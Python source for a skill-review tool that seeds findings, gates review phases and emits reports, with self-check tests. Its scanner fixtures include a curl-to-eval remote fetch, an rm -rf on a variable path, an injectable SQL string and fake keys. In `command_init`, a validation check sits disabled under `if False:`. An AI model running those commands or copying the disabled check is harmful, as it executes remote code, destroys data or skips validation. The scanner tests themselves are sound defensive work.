    check is for. What reaches the members collectively is a wildcard, or a
    placeholder standing where the filename goes, so the shape is matched at
    the filename position rather than anywhere in the path.
    """
    return re.compile(re.escape(directory) + r"/(?:\*|\{[^}\n/]*\}|<[^>\n/]*>)")


def unreachable_findings(skill_root):
    """Name the prose resources nothing else in the skill points at.

    The structure phase asks whether every resource is actually reachable
    from the core instructions. A resource no other file mentions cannot be
    loaded by an agent following the skill: it is shipped weight that reads
    like coverage, and reviewers miss it because absence is what you have to
    notice, and nothing draws the eye to a file that is never named.

    Matches a bare basename anywhere, not a well-formed link, which is
    deliberately generous. A resource listed by name in a README is reachable
    enough for a reader to find, and over-reporting a reachable file trains
    reviewers to skip the whole category. A file naming itself proves nothing
    and is excluded.

    A directory is a route too, and missing that made this check mostly wrong:
    35 of the 36 findings it produced across the author's corpus named a file
    whose directory the skill routes to collectively. Two shapes do it. A glob,
    `Glob {baseDir}/platforms/*.md`, reaches every file in one line. So does a
    placeholder, `Read agents/{concern}.md`, which is the same instruction with
    the expansion left to the agent. Reporting those as unreachable is the
    failure mode the generous basename match already avoids, arriving one level
    up: a reviewer who checks the first few findings learns the category is
    noise and stops reading it, which costs the one real finding underneath.

    A bare directory mention does not count, though the same generosity would
    argue for it. `references/linked.md` names a directory too, and accepting
    that shape means one link to one file exempts every sibling from the rule:
    the check would go quiet on exactly the directories that have the most to
    hide. The wildcard has to sit where the filename goes.
    """
    resources = {}
    for path, relative in own_files(skill_root):
        if path.suffix != ".md":
            continue
        if len(relative.parts) > 1 and relative.parts[0] in RESOURCE_DIRS:
            resources[relative.as_posix()] = path
    if not resources:
        return []

    # Reachability is asked of this skill's own files for the same reason the
    # resource list is. A vendored copy of another skill that happens to name
    # `naming.md` would make this skill's unreachable `references/naming.md`
    # read as routed, and the direction of that error is the harmful one: it
    # reports coverage that does not exist.
    # A directory counts as routed when something outside it names the
    # directory, so the members are reached collectively. Built once rather
    # than per resource, since the question is about the directory.
    routed_directories = set()
    named = set()
    for path, relative in own_files(skill_root):
        lines = readable_lines(path)
        if lines is None:
            continue
        text = "\n".join(lines)
        for key, target in resources.items():
            if target != path and target.name in text:
                named.add(key)
        for directory in {PurePosixPath(key).parent.as_posix() for key in resources}:
            # A file inside the directory naming it says nothing about whether
            # anything routes to it, exactly as a file naming itself does not.
            if relative.as_posix().startswith(directory + "/"):
                continue
            if collective_route(directory).search(text):
                routed_directories.add(directory)
    named |= {key for key in resources if PurePosixPath(key).parent.as_posix() in routed_directories}

    return [
        {
            "phase": "structure",
            "severity": "major",
            "summary": f"{key} is named by no other file, so nothing can route an agent to it",
            "evidence": key,
            "remedy": "link it from the resource that owns the concern, or delete it if its content lives elsewhere",
            "disposition": None,
            "disposition_note": None,
            "source": "structure:unreachable",
            "recorded_at": now(),
        }
        for key in sorted(resources)
        if key not in named
    ]


def conformance_findings(skill_root):
    """Findings a parser can settle, recorded before any judgement is spent.

    A review used to open with an empty findings file and ask a human every
    question, including the ones with exact answers: a name over 64 characters
    or a link to a file that does not exist is not a matter of opinion, and a
    reviewer who happened not to check left the skill rejected at install time
    with a passing verdict.

    Seeding them at init also fixes the ordering. These are cheap and certain,
    so they belong before the expensive uncertain questions, and a reviewer
    reading `findings.json` first sees what is already known.

    Severity maps by whether the format rejects the skill: an error means a
    host will not load it, which blocks; a warning is guidance an author may
    knowingly accept, which does not.

    The remedy comes from the validator rather than being left for the
    reviewer: record-finding requires one from a human, and a seeded finding
    without it would reach remediate.py as an obligation with no stated fix.
    """
    findings = [
        {
            "phase": "activation",
            "severity": "blocking" if finding.severity == "error" else "minor",
            "summary": finding.message,
            "evidence": "SKILL.md",
            "remedy": finding.remedy,
            "disposition": None,
            "disposition_note": None,
            "source": f"{CONFORMANCE_PREFIX}{finding.rule}",
            "recorded_at": now(),
        }
        for finding in validate_skill(skill_root)
    ]
    # A directory holding skills is not a malformed skill, and reporting it as
    # one ends the review at the top of a tree with real skills in it. Two
    # collections on the author's corpus answered `no SKILL.md` while carrying
    # 104 and 11 skills; every one went unreviewed, and the report gave a
    # reviewer no reason to suspect otherwise. Naming them is the whole remedy:
    # each is reviewed by pointing a run at it, and choosing which is a
    # judgement this cannot make.
    if not (skill_root / "SKILL.md").is_file():
        # Shallowest first, and a skill nested inside another skill is that
        # skill's vendored copy rather than one of this collection's own. Both
        # orderings matter for the same reason: the reviewer reads the first
        # few names and should meet the ones a run would be pointed at.
        nested = sorted(nested_skill_roots(skill_root), key=lambda path: (len(path.parts), path))
        nested = [path for path in nested if not any(path.is_relative_to(other) for other in nested if other != path)]
        if nested:
            shown = ", ".join(path.relative_to(skill_root).as_posix() for path in nested[:MAX_EVIDENCE])
            more = f" and {len(nested) - MAX_EVIDENCE} more" if len(nested) > MAX_EVIDENCE else ""
            findings.append(
                {
                    "phase": "activation",
                    "severity": "blocking",
                    "summary": (
                        f"{skill_root.name} contains {len(nested)} skills rather than being one, "
                        f"so this run reviews none of them: {shown}{more}"
                    ),
                    "evidence": nested[0].relative_to(skill_root).as_posix() + "/SKILL.md",
                    "remedy": "review each nested skill by starting a run against its own directory",
                    "disposition": None,
                    "disposition_note": None,
                    "source": f"{CONFORMANCE_PREFIX}collection",
                    "recorded_at": now(),
                }
            )
    return findings


def command_init(args):
    skill_root = args.skill.expanduser().resolve()
    if False:
        fail(f"Skill must be a directory containing SKILL.md: {skill_root}")
    root = create_run(args.run_dir, (skill_root, "the skill under review"))
    for name in (args.surface or []) + (args.skip_surface or []):
        if name not in SURFACES:
            fail(f"Unknown surface {name!r}; choose from {', '.join(SURFACES)}")
    evidence = detect_surfaces(skill_root)
    detected = [name for name in SURFACES if evidence[name]]
    surfaces = [name for name in detected if name not in (args.skip_surface or [])]
    for name in args.surface or []:
        if name not in surfaces:
            surfaces.append(name)
    surfaces = [name for name in SURFACES if name in surfaces]
    phases = derive_phases(surfaces)
    root.mkdir(parents=True, exist_ok=True)
    write_json(
        root / "inventory.json",
        {
            "skill": str(skill_root),
            "detected": detected,
            "evidence": evidence,
            "forced": args.surface or [],
            "skipped": args.skip_surface or [],
            "recorded_at": now(),
        },
    )
    state = {
        "version": VERSION,
        "skill": {
            "name": slug(args.name or skill_root.name),
            "path": str(skill_root),
            # Which phases this run will even have is derived from the surfaces
            # detected right here, so the skill as it stands now is what the
            # review is a review of. Without recording it, a surface added
            # afterwards is never examined by any phase and still receives the
            # run's verdict.
            "sha256": tree_sha256(relative_file_manifest(skill_root)),
        },
        "surfaces": surfaces,
        "phases": phases,
        "completed": [],
        "created_at": now(),
        "updated_at": now(),
    }
    state["phase"] = phases[0]
    # Written at init so a clean review is a file saying nothing was found,
    # not a missing file. A consumer cannot tell an absent artifact from a
    # review that found nothing, and would have to treat a passing skill as an
    # error, which is the reading remediation hit.
    #
    # Non-empty when the format's own bounds are already broken: those have
    # exact answers, so spending a reviewer's judgement to rediscover them
    # wastes the expensive resource on the cheap question.
    seeded = (
        conformance_findings(skill_root)
        + safety_findings(skill_root)
        + unreachable_findings(skill_root)
        + naming_findings(skill_root)
        + neutrality_findings(skill_root)
        + portability_findings(skill_root)
        + layout_findings(skill_root)
    )
    for index, finding in enumerate(seeded, start=1):
        finding["id"] = f"F{index}"
    save_findings(root, seeded)
    save_state(root, state, "initialized")
    print_status(root, state)


def command_status(args):
    root, state = open_run(args.run_dir)
    if args.history:
        print(json.dumps(read_history(root), indent=2, sort_keys=True))
        return
    print_status(root, state)


def command_record_finding(args):
    """Findings attach to a reached phase so evidence precedes judgement."""
    root, state = open_run(args.run_dir)
    # A finding cites a path and a line. Both are claims about a specific tree,
    # so recording one against a changed skill files evidence that may no longer
    # be there, under a run whose other findings describe the earlier tree.
    require_unchanged_skill(state)
    phase = pending_phase(state)
    reached = state["completed"] + ([phase] if phase else [])
    if args.phase not in reached:
        fail(f"Phase {args.phase!r} is not reached yet; reached phases: {', '.join(reached)}")
    if args.severity not in SEVERITIES:
        fail(f"Severity must be one of {', '.join(SEVERITIES)}")
    require_text(args.summary, "--summary")
    require_evidence(args.evidence, Path(state["skill"]["path"]))
    findings = load_findings(root)
    finding = {
        "id": f"F{len(findings) + 1}",
        "phase": args.phase,
        "severity": args.severity,
        "summary": args.summary,
        "evidence": args.evidence,
        # Optional: a review that names a defect it cannot yet fix is still a
        # review. Recorded when known so the remediation run triages against
        # the reviewer's statement rather than re-deriving one.
        "remedy": args.remedy or None,
        "disposition": None,
        "disposition_note": None,
        "recorded_at": now(),
    }
    findings.append(finding)
    save_findings(root, findings)
    save_state(root, state, f"finding-recorded:{finding['id']}")
    print(json.dumps(finding, indent=2, sort_keys=True))


def command_resolve_finding(args):
    root, state = open_run(args.run_dir)
    # Disposing of a finding is a judgement that the cited evidence no longer
    # blocks, which is only meaningful against the tree the evidence points
    # into. Fixing the skill and then closing the finding in the same run would
    # record the disposition against a tree the review never re-examined.
    require_unchanged_skill(state)
    if args.disposition not in DISPOSITIONS:
        fail(f"Disposition must be one of {', '.join(DISPOSITIONS)}")
    require_text(args.note, "--note")
    findings = load_findings(root)
    for finding in findings:
        if finding["id"] == args.id:
            finding["disposition"] = args.disposition
            finding["disposition_note"] = args.note
            finding["resolved_at"] = now()
            save_findings(root, findings)
            save_state(root, state, f"finding-resolved:{args.id}")
            print(json.dumps(finding, indent=2, sort_keys=True))
            return
    fail(f"Unknown finding id: {args.id}")


def require_unchanged_skill(state):
    """Refuse to record a conclusion about a tree that is no longer the one reviewed.

    A review's phases are derived from the surfaces present at init, so a
    surface that appears later has no phase to examine it and still collects
    the run's verdict. Editing the skill mid-run is a legitimate thing to do,
    which is why this asks for a new run rather than failing the skill: the
    conclusions reached so far were about a tree that no longer exists.
    """
    recorded = (state.get("skill") or {}).get("sha256")
    if not recorded:
        return
    current = tree_sha256(relative_file_manifest(Path(state["skill"]["path"])))
    if current != recorded:
        fail(
            "the skill changed since this review began, so the phases already "
            "closed describe a tree that no longer exists; start a new run",
            EX_DATAERR,
        )


def command_complete_phase(args):
    root, state = open_run(args.run_dir)
    require_unchanged_skill(state)
    expected = pending_phase(state)
    if expected is None:
        fail("All phases already complete")
    if args.phase != expected:
        fail(f"Next phase is {expected!r}, not {args.phase!r}")
    require_text(args.note, "--note")
    findings = load_findings(root)
    blocking = unresolved_blocking(findings)
    if expected == "verdict" and blocking:
        fail(f"Cannot close the verdict with unresolved blocking findings: {', '.join(blocking)}")
    # A phase closed on a note alone reported the same way whether its
    # contract was worked through or skimmed, so coverage was a matter of who
    # was reviewing. Every question the contract asks of this phase is now
    # either answered here or already settled by a finding.
    outstanding = outstanding_questions(root, expected, findings)
    if outstanding:
        listed = "; ".join(f"{identifier} {text}" for identifier, text in outstanding)
        fail(f"Phase {expected!r} has unanswered review questions (use answer): {listed}")
    write_artifact(
        root / "decisions" / f"{expected}.json",
        "decision.schema.json",
        {
            "phase": expected,
            "resource": phase_resource(expected),
            "note": args.note,
            "recorded_at": now(),
        },
    )
    state["completed"].append(expected)
    state["phase"] = pending_phase(state) or "complete"
    save_state(root, state, phase_complete_event(expected))
    if state["phase"] == "complete":
        write_report(root, state, findings)
    print_status(root, state)


def command_answer(args):
    """Settle one contract question with evidence.

    A phase used to close on a single free-text note, so a five-question
    contract was satisfiable by one sentence. Whichever question the reviewer
    happened to think about got answered and the rest were passed over in
    silence, indistinguishable in the record from questions that were asked
    and held.

    `holds` demands evidence exactly as `violated` does. A pass is a claim
    about the skill, and an unevidenced pass is the thing this gate exists to
    stop being cheap.
    """
    root, state = open_run(args.run_dir)
    require_unchanged_skill(state)
    phase = pending_phase(state)
    reached = state["completed"] + ([phase] if phase else [])
    # A question id is `<phase>.<n>`. Splitting before validating would read a
    # bare word as a phase name and hand it to the parser, which is how a typo
    # became a traceback instead of a sentence saying which id was wrong.
    asked_in, _, _ = args.question.partition(".")
    known = dict(phase_questions(asked_in))
    if args.question not in known:
        fail(f"Unknown question id: {args.question}")
    if asked_in not in reached:
        fail(f"Phase {asked_in!r} is not reached yet; reached phases: {', '.join(reached)}")
    if args.verdict not in VERDICTS:
        fail(f"Verdict must be one of {', '.join(VERDICTS)}")
    # The schema's `text` type also rejects whitespace; this names the flag the
    # caller passed rather than a JSON pointer, and resolves a cited path
    # against the skill so an answer cannot close a question with a citation
    # that leads nowhere.
    require_evidence(args.evidence, Path(state["skill"]["path"]))
    findings = load_findings(root)
    if args.finding and not any(item["id"] == args.finding for item in findings):
        fail(f"Unknown finding id: {args.finding}")
    # A question the reviewer answers `violated` states a defect, and a defect
    # the run does not carry as a finding never reaches the report or the
    # remediation that follows it.
    if args.verdict == "violated" and not args.finding:
        fail("A violated question needs --finding naming the finding that records it")
    answers = load_answers(root)
    answers[args.question] = {
        "question": known[args.question],
        "verdict": args.verdict,
        "evidence": args.evidence,
        "finding": args.finding or None,
        "recorded_at": now(),
    }
    save_answers(root, answers)
    save_state(root, state, f"question-answered:{args.question}")
    print(json.dumps(answers[args.question], indent=2, sort_keys=True))


def command_add_surface(args):
    """Late discovery is normal; extend the phase list without losing findings."""
    root, state = open_run(args.run_dir)
    if args.surface not in SURFACES:
        fail(f"Unknown surface {args.surface!r}")
    if args.surface in state["surfaces"]:
        fail(f"Surface already present: {args.surface}")
    surfaces = [name for name in SURFACES if name in state["surfaces"] + [args.surface]]
    phases = derive_phases(surfaces)
    missing = [phase for phase in state["completed"] if phase not in phases]
    if missing:
        fail(f"Refusing to drop completed phases: {missing}")
    if args.surface in state["completed"]:
        fail(f"Refusing to reopen a completed phase: {args.surface}")
    state["surfaces"] = surfaces
    state["phases"] = phases
    state["phase"] = pending_phase(state) or "complete"
    # Adding a surface is the reviewer stating that the subject is now known to
    # cover more than the run assumed, which is the one moment a changed tree is
    # accounted for rather than ignored. Re-baselining here is what keeps the
    # drift guard from turning the documented recovery into a dead end: without
    # it a skill that gained a coordinator mid-review could be extended and then
    # never closed. The new phase covers the new material, so the conclusions
    # from here are about the tree recorded here.
    skill = dict(state.get("skill") or {})
    if skill.get("sha256"):
        skill["sha256"] = tree_sha256(relative_file_manifest(Path(skill["path"])))
        state["skill"] = skill
    save_state(root, state, f"surface-added:{args.surface}")
    print_status(root, state)


def write_report(root, state, findings):
    counts = {level: sum(1 for item in findings if item["severity"] == level) for level in SEVERITIES}
    answers = load_answers(root)
    asked = [identifier for phase in state["phases"] for identifier, _ in phase_questions(phase)]
    # Counted by asking the gate, rather than by a second rule that agrees with
    # it most of the time. The two had drifted apart: the report matched ids
    # alone, so an answer the gate had rejected as belonging to a question the
    # contract has since moved was still reported as coverage. A report that
    # overstates what a review established is worse than no count at all.
    outstanding = {
        identifier for phase in state["phases"] for identifier, _ in outstanding_questions(root, phase, findings)
    }
    covered = [identifier for identifier in asked if identifier not in outstanding]
    lines = [
        f"# Skill Review: {state['skill']['name']}",
        "",
        f"- Skill: {state['skill']['path']}",
        f"- Surfaces reviewed: {', '.join(state['surfaces']) or 'none'}",
        f"- Phases: {', '.join(state['phases'])}",
        f"- Findings: {counts['blocking']} blocking, {counts['major']} major, {counts['minor']} minor",
        f"- Contract questions answered: {len(covered)}/{len(asked)}",
        "",
        "## Findings",
        "",
    ]
    if findings:
        lines.append("| ID | Phase | Severity | Summary | Evidence | Disposition |")
        lines.append("|---|---|---|---|---|---|")
        for item in findings:
            lines.append(
                "| {id} | {phase} | {severity} | {summary} | {evidence} | {disposition} |".format(
                    disposition=item["disposition"] or "open",
                    **{
                        key: str(item[key]).replace("|", "\\|")
                        for key in ("id", "phase", "severity", "summary", "evidence")
                    },
                )
            )
    else:
        lines.append("No findings recorded.")
    # A reader who was not present cannot tell a question that held from one
    # nobody asked unless the answers are in the report. Listing them is what
    # makes "reviewed" mean something specific rather than a claim about
    # effort.
    lines.extend(["", "## Contract Questions", ""])
    lines.append("| Question | Verdict | Evidence |")
    lines.append("|---|---|---|")
    by_finding = answered_by_findings(findings)
    for identifier in asked:
        answer = answers.get(identifier)
        if answer:
            verdict, evidence = answer["verdict"], answer["evidence"]
        elif identifier in by_finding:
            verdict, evidence = "violated", f"see {by_finding[identifier]}"
        else:
            verdict, evidence = "unanswered", ""
        text = dict(phase_questions(identifier.split(".")[0])).get(identifier, identifier)
        lines.append(f"| {identifier} {text.replace('|', chr(92) + '|')} | {verdict} | {evidence} |")
    lines.extend(["", "## Phase Decisions", ""])
    for phase in state["phases"]:
        decision = read_json(root / "decisions" / f"{phase}.json")
        lines.append(f"- **{phase}** ({decision['resource']}): {decision['note']}")
    (root / "report.md").write_text("\n".join(lines) + "\n")
    write_sarif(root, state, findings)


def split_evidence(evidence):
    """Separate `path:line` into a path and a 1-based line, if a line is present.

    Evidence is required to name a path but not a line, so a finding about a
    whole file stays a file-level result rather than being forced onto line 1,
    which would put an annotation on an arbitrary line of source.
    """
    path, separator, tail = evidence.rpartition(":")
    if separator and tail.isdigit() and path:
        return path, int(tail)
    return evidence, None


def sarif_location(evidence):
    path, line = split_evidence(evidence)
    location = {"artifactLocation": {"uri": path}}
    if line is not None:
        location["region"] = {"startLine": line}
    return {"physicalLocation": location}


def write_sarif(root, state, findings):
    """Emit the same findings a machine can act on.

    report.md is human-only: a verdict cannot gate CI or annotate a pull
    request without a reviewer transcribing it. findings.json already carries
    everything SARIF needs, and record-finding requires evidence with a path,
    so the mapping to a location is total rather than best-effort.

    Constructed directly because SARIF is JSON. The obvious library, sarif-tools,
    reads and summarises SARIF rather than building it, and would pull matplotlib
    and python-docx into a coordinator that only writes a document.
    """
    rules = []
    results = []
    for phase in state["phases"]:
        rules.append(
            {
                "id": phase,
                "name": phase,
                "shortDescription": {"text": f"Skill review: {phase}"},
                "helpUri": f"{HELP_BASE}/{phase_resource(phase)}",
            }
        )
    known = {rule["id"] for rule in rules}
    for item in findings:
        if item["phase"] not in known:
            fail(f"Finding {item['id']} names phase {item['phase']!r}, which is not in the run")
        result = {
            "ruleId": item["phase"],
            "level": SARIF_LEVELS[item["severity"]],
            "message": {"text": item["summary"]},
            "locations": [sarif_location(item["evidence"])],
            "properties": {"findingId": item["id"], "disposition": item["disposition"]},
        }
        # A finding a reviewer accepted is still a finding. Dropping it would
        # misreport the review as having found nothing there.
        if item["disposition"] in ("accepted", "deferred"):
            suppression = {"kind": "external", "status": "accepted"}
            if item.get("disposition_note"):
                suppression["justification"] = item["disposition_note"]
            result["suppressions"] = [suppression]
        results.append(result)
    document = {
        "$schema": SARIF_SCHEMA,
        "version": "2.1.0",
        "runs": [
            {
                "tool": {
                    "driver": {
                        "name": TOOL_NAME,
                        "informationUri": HELP_BASE,
                        "rules": rules,
                    }
                },
                "results": results,
                "invocations": [
                    {
                        "executionSuccessful": True,
                        "endTimeUtc": now(),
                        "workingDirectory": {"uri": Path(state["skill"]["path"]).as_uri()},
                    }
                ],
            }
        ],
    }
    write_json(root / "report.sarif", document)


def command_self_check(_args):
    import subprocess
    import tempfile

    executable = Path(__file__).resolve()

    def execute(*arguments, check=True):
        return subprocess.run(
            [sys.executable, str(executable), *map(str, arguments)],
            check=check,
            capture_output=True,
            text=True,
        )

    def settle(run, phase):
        """Answer whatever the phase still asks, for cases testing something else.

        Cases about drift detection or note validation should not have to
        restate the whole contract to reach the code they exercise.
        """
        for identifier, _ in phase_questions(phase):
            execute(
                "answer",
                "--run-dir",
                run,
                "--question",
                identifier,
                "--verdict",
                "holds",
                "--evidence",
                "SKILL.md:1 checked",
                check=False,
            )

    with tempfile.TemporaryDirectory() as temporary:
        root = Path(temporary)

        # A plain skill with no workflow surfaces walks only mandatory phases.
        plain = root / "plain"
        plain.mkdir()
        # Frontmatter included because init now seeds the findings a parser can
        # settle, and a fixture that is not a valid skill would open every run
        # with conformance findings the rest of this check did not record.
        (plain / "SKILL.md").write_text(
            "---\nname: plain\ndescription: Does one thing directly.\n---\n\n# Plain\n\nDo one thing directly.\n"
        )
        run = root / "plain-run"
        result = execute("init", "--skill", plain, "--run-dir", run)
        # A conformant skill opens with nothing already known against it, so a
        # seeded finding always means the validator found something real.
        assert json.loads((run / "findings.json").read_text())["findings"] == []

        # A skill the format would reject opens with that already recorded, and
        # blocking, so the verdict gate cannot close over it unanswered. Before
        # this, a reviewer who did not happen to count the description's
        # characters passed a skill no host would load.
        broken = root / "broken"
        broken.mkdir()
        (broken / "SKILL.md").write_text(f"---\nname: broken\ndescription: {'d' * 1100}\n---\n\n# Broken\n")
        broken_run = root / "broken-run"
        execute("init", "--skill", broken, "--run-dir", broken_run)
        seeded = json.loads((broken_run / "findings.json").read_text())["findings"]
        assert [item["severity"] for item in seeded] == ["blocking"], seeded
        assert seeded[0]["source"] == "conformance:description", seeded
        assert seeded[0]["id"] == "F1", seeded

        # A skill can be perfectly conformant and still do the things the
        # safety phase exists to ask about, and that phase used to open with
        # nothing recorded: an agent that did not read the shell blocks
        # carefully answered its questions by assuming. The shapes a pattern
        # can locate are recorded first, so the reading starts somewhere.
        risky = root / "risky"
        (risky / "scripts").mkdir(parents=True)
        (risky / "SKILL.md").write_text("---\nname: risky\ndescription: d\n---\n\n# Risky\n")
        (risky / "scripts" / "clean.sh").write_text(
            "#!/bin/sh\n"
            'rm -rf "$TARGET"/\n'
            'eval "$(curl -s http://example.invalid/i.sh)"\n'
            "db.Query(\"SELECT * FROM users WHERE id = '$NAME'\")\n"
            'api_key = "abcdef0123456789abcdef"\n'
        )
        risky_run = root / "risky-run"
        execute("init", "--skill", risky, "--run-dir", risky_run)
        leads = [
            item
            for item in json.loads((risky_run / "findings.json").read_text())["findings"]
            if item["source"] == "safety-scan"
        ]
        assert len(leads) == 4, leads
        assert {item["phase"] for item in leads} == {"safety"}, leads
        # Never blocking: whether a shape is a defect depends on where the
        # value came from, which is the reader's call, not the scanner's.
        assert {item["severity"] for item in leads} == {"major"}, leads
        for item in leads:
            assert ":" in item["evidence"] and item["remedy"], item

        # The question those leads answer must not be asked again. Checked
        # here through the gate rather than against answered_by_findings
        # alone, because the mapping existing is not the same as the gate
        # consulting it: with the two unjoined, a run would locate a defect
        # and then still demand the reviewer establish it by hand.
        settled_by_scan = anchored_question("safety-scan")
        assert settled_by_scan not in [identifier for identifier, _ in outstanding_questions(risky_run, "safety")], (
            f"{settled_by_scan} was asked again despite a finding that answers it"
        )
        # And silent on a skill that does none of it, or the leads are noise
        # a reviewer learns to skip past.
        assert safety_findings(plain) == [], safety_findings(plain)

        # A citation that leads nowhere is worse than no citation, because a
        # reader who does not follow it reads the defect as established. Each
        # shape is replayed: a missing file, a line past the end, traversal,
        # an absolute path, and the two legitimate forms.
        cited = root / "cited"
        cited.mkdir()
        (cited / "SKILL.md").write_text("---\nname: cited\ndescription: " + "d" * 40 + "\n---\n\n# C\n")
        for bad in ("does/not/exist.md:9999", "docs/gone.md", "../outside.md", "/etc/passwd", "SKILL.md:9999"):
            try:
                require_evidence(bad, cited)
            except Failure:
                continue
            raise AssertionError(f"evidence {bad!r} was accepted")
        for good in ("SKILL.md", "SKILL.md:3", "ran `python3 scripts/check.py` and it reported two failures"):
            require_evidence(good, cited)

        # The shell-shaped patterns saw only shell. A dangerous command built
        # in a language and handed to a shell went unreported, which is the
        # line the safety phase exists to find, so each language spelling is
        # replayed with the safe form of the same call beside it.
        language = root / "language"
        language.mkdir()
        (language / "SKILL.md").write_text("---\nname: language\ndescription: " + "d" * 40 + "\n---\n\n# L\n")
        unsafe = [
            'os.system("rm -rf " + target)',
            'os.system(f"rm -rf {path}")',
            'subprocess.run(f"rm -rf {path}", shell=True)',
            "shutil.rmtree(user_supplied)",
            "eval(user_input)",
        ]
        (language / "run.py").write_text("\n".join(unsafe) + "\n")
        (language / "run.js").write_text("child_process.exec(`git checkout ${branch}`)\nexecSync('rm -rf ' + dir)\n")
        located = {item["evidence"] for item in safety_findings(language)}
        assert located == {f"run.py:{number}" for number in range(1, len(unsafe) + 1)} | {"run.js:1", "run.js:2"}, (
            located
        )
        # The safe spelling of each is the whole point of reporting the unsafe
        # one, so a scanner that cannot tell them apart reports nothing useful.
        safe = [
            'subprocess.run(["rm", "-rf", str(path)], check=True)',
            'os.system("clear")',
            'shutil.rmtree("build")',
            'exec(compile(source, "<x>", "exec"), namespace)',
            "# eval(x) would be unsafe here",
            "result = evaluate(data)",
            "shell = True  # documented, and no command on this line",
        ]
        (language / "run.py").write_text("\n".join(safe) + "\n")
        (language / "run.js").write_text("execFile('git', ['checkout', branch])\n")
        assert safety_findings(language) == [], safety_findings(language)

        # Membership in the scan was an allowlist of ten suffixes, so a skill
        # shipping any other language was not partially scanned but entirely
        # unscanned, and the phase reported clean. A file is text if it decodes
        # as text, which is the question that was actually being asked.
        for name, body in (
            ("deploy.ps1", '$k = "api_key=AbCdEf0123456789xyz"'),
            ("hook.php", '$token = "secret=AbCdEf0123456789xyz";'),
            ("Dockerfile", 'RUN eval "$(curl -s http://x.invalid/i.sh)"'),
        ):
            (language / name).write_text(body + "\n")
            assert safety_findings(language), f"{name} was skipped for having an unlisted suffix"
            (language / name).unlink()
        # A binary is skipped rather than decoded into accidental matches, and
        # must not crash the scan that now reads every other file.
        (language / "logo.png").write_bytes(bytes(range(256)) * 40)
        assert safety_findings(language) == [], "a binary file produced findings"
        (language / "logo.png").unlink()

        # A reference nothing names is unreachable: an agent following the
        # skill can never load it. Reviewers miss this because it is an
        # absence, and no file draws attention to the file that is missing
        # from it. Two corpus skills ship references in exactly this state.
        stranded = root / "stranded"
        (stranded / "references").mkdir(parents=True)
        (stranded / "SKILL.md").write_text(
            "---\nname: stranded\ndescription: d\n---\n\n# Stranded\n\nSee [linked](references/linked.md).\n"
        )
        (stranded / "references" / "linked.md").write_text("# Linked\n")
        (stranded / "references" / "orphan.md").write_text("# Orphan\n\nNothing points here.\n")
        stray = unreachable_findings(stranded)
        assert [item["evidence"] for item in stray] == ["references/orphan.md"], stray
        assert stray[0]["phase"] == "structure", stray

        # Core guidance naming one host's own directory is the defect that
        # makes a skill unmovable: the state cannot follow the user to another
        # runtime without a migration. A reviewer catches it only by reading
        # every document for a path shape, and the shape is easy to read past.
        (stranded / "references" / "linked.md").write_text(
            "# Linked\n\nStore settings in `~/.windsurf/settings.json`.\n"
        )
        bound = neutrality_findings(stranded)
        assert [item["evidence"] for item in bound] == ["references/linked.md:3"], bound
        assert bound[0]["phase"] == "structure" and bound[0]["severity"] == "major", bound
        # The neutral answer must not be reported, or the finding would argue
        # against the very fallback references/settings.md tells authors to use.
        (stranded / "references" / "linked.md").write_text(
            "# Linked\n\nResolve `$XDG_CONFIG_HOME`, defaulting to `~/.config`.\n"
        )
        assert neutrality_findings(stranded) == [], neutrality_findings(stranded)
        # A tool a skill integrates with also keeps a per-user directory, and
        # that directory is the skill's subject matter. Reporting it asks the
        # author to delete the path the skill exists to read.
        (stranded / "references" / "linked.md").write_text("# Linked\n\nThe ledger is at `~/.banana/costs.json`.\n")
        assert neutrality_findings(stranded) == [], neutrality_findings(stranded)
        # Corroboration is what separates the two, and it is read across the
        # whole document because a settings reference names the install path
        # once and the home directory on every later line.
        (stranded / "references" / "linked.md").write_text(
            "# Linked\n\nCopy into `.banana/skills/`.\n\nThe ledger is at `~/.banana/costs.json`.\n"
        )
        corroborated = [item["evidence"] for item in neutrality_findings(stranded)]
        assert "references/linked.md:5" in corroborated, corroborated
        # Computing a finding and never seeding it leaves the reviewer exactly
        # as uninformed, so this is asserted through init as well.
        (stranded / "references" / "linked.md").write_text("# Linked\n\nCopy into `.aider/skills/`.\n")
        neutral_run = root / "neutral-run"
        execute("init", "--skill", stranded, "--run-dir", neutral_run)
        seeded = json.loads((neutral_run / "findings.json").read_text())["findings"]
        assert "structure:neutrality" in [item["source"] for item in seeded], seeded
        # The finding must settle the contract question it is anchored to, or
        # the run asks the reviewer to establish by hand what it already knows.
        assert anchored_question("structure:neutrality") is not None, "the neutrality anchor resolves to nothing"
        assert anchored_question("structure:portability") is not None, "the portability anchor resolves to nothing"
        assert anchored_question("structure:layout") is not None, "the layout anchor resolves to nothing"

        # A directory one letter from a routed destination is not an
        # alternative convention, it is the destination misspelled: guidance,
        # README, and habit all say `references/`, so every route written from
        # memory looks where the files are not.
        (stranded / "reference").mkdir()
        (stranded / "reference" / "note.md").write_text("# Note\n")
        misrouted = layout_findings(stranded)
        assert [item["evidence"] for item in misrouted] == ["reference"], misrouted
        assert misrouted[0]["remedy"] == "move reference/ into references/", misrouted
        # Reported once however many files sit under it, since the finding is
        # about the directory: humanise-text holds three and a per-file report
        # would ask for the same rename three times.
        (stranded / "reference" / "second.md").write_text("# Second\n")
        assert len(layout_findings(stranded)) == 1, layout_findings(stranded)
        (stranded / "reference" / "note.md").unlink()
        (stranded / "reference" / "second.md").unlink()
        (stranded / "reference").rmdir()

        # The second shape the table decides on its own: a directory named for
        # material the table already routes. `schemas/` is not an unconventional
        # arrangement, it is the Material column written as a directory name and
        # then not followed, which is why this repository's own tree tripped it.
        (stranded / "schemas").mkdir()
        (stranded / "schemas" / "run.json").write_text("{}\n")
        material = layout_findings(stranded)
        assert [item["evidence"] for item in material] == ["schemas"], material
        assert material[0]["remedy"] == "move schemas/ into references/", material
        # Routing governs the skill root only. The same name inside a
        # destination is that destination organising itself, and reporting it
        # would make this a rule about nesting depth rather than routing.
        (stranded / "schemas").rename(stranded / "references" / "schemas")
        assert layout_findings(stranded) == [], layout_findings(stranded)
        (stranded / "references" / "schemas" / "run.json").unlink()
        (stranded / "references" / "schemas").rmdir()
        # `workflow/` must resolve, which is the case the table used to be
        # unable to decide: this repository ships `workflows/` and so do twelve
        # other skills, yet the table named four destinations and not that one,
        # so the near-miss went unreported for the one directory the skill that
        # owns the table uses itself.
        assert misrouted_directory("workflow") == "workflows", misrouted_directory("workflow")
        # Every routed material noun must name a real destination, or the
        # remedy sends the reviewer to a directory the table does not have.
        for destination in ROUTED_MATERIAL.values():
            assert destination in ROUTED_DIRS, destination
